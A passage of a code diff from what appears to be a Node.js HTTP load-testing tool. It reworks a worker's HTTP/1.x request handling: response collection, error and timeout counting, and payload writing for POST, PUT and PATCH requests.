+        // Collect response data
+        let responseData = Buffer.alloc(0);
+        response.on('data', (chunk) => {
+          responseData = Buffer.concat([responseData, chunk]);
+          workerStats.bytesReceived += chunk.length;
+        });
+        
+        response.on('end', () => {
+          workerStats.requests++;
+          
+          // Check if we got back any cookies
+          const setCookieHeader = response.headers['set-cookie'];
+          if (setCookieHeader && options.verbose) {
+            console.log(`Received cookies: ${setCookieHeader}`);
+          }
+        });
+      });
+      
+      request.on('error', (err) => {
+        if (options.verbose) {
+          console.error(`HTTP/1.${options.protocol === 'http1.0' ? '0' : '1'} request error: ${err.message}`);
+        }
         workerStats.failed++;
+        workerStats.requests++;
+        workerStats.statusCodes[`http1_error`] = (workerStats.statusCodes[`http1_error`] || 0) + 1;
+      });
+      
+      // Set timeout
+      request.setTimeout(options.timeout || 10000, () => {
+        request.destroy();
+        workerStats.failed++;
+        workerStats.requests++;
+        workerStats.statusCodes['timeout'] = (workerStats.statusCodes['timeout'] || 0) + 1;
+      });
+      
+      // Send payload if applicable
+      if (['POST', 'PUT', 'PATCH'].includes(options.method)) {
+        if (payloadData) {
+          const buffer = Buffer.from(payloadData);
+          workerStats.bytesSent += buffer.length;
+          request.write(buffer);
+        } else if (options.method !== 'GET') {
+          const defaultPayload = `data=${Date.now()}`;
+          const buffer = Buffer.from(defaultPayload);
+          workerStats.bytesSent += buffer.length;
+          request.write(buffer);
+        }
       }
       
-      workerStats.requests++;
-      try {
-        client.close();
-      } catch (e) {
-        // Ignore close errors
+      request.end();
+    } catch (error) {
+      if (options.verbose) {
+        console.error(`HTTP/1.${options.protocol === 'http1.0' ? '0' : '1'} error: ${error.message}`);
       }
-    });
-    
-    req.on('error', () => {
       workerStats.failed++;
       workerStats.requests++;
-      try {
-        client.close();
-      } catch (e) {
-        // Ignore close errors
-      }
-    });
-    
-    // Send payload if applicable
-    if (['POST', 'PUT', 'PATCH'].includes(requestOptions.method)) {
-      // Default to empty payload if none provided
-      let payload = payloadData;
-      if (!payload && requestOptions.method !== 'GET') {
-        payload = `data=${Date.now()}`;
-      }
-      
-      if (payload) {
-        const buffer = Buffer.from(payload);
-        workerStats.bytesSent += buffer.length;
-        req.write(buffer);
-      }
+      workerStats.statusCodes[`http1_setup_error`] = (workerStats.statusCodes[`http1_setup_error`] || 0) + 1;
     }
-    
-    req.end();
   }
 }
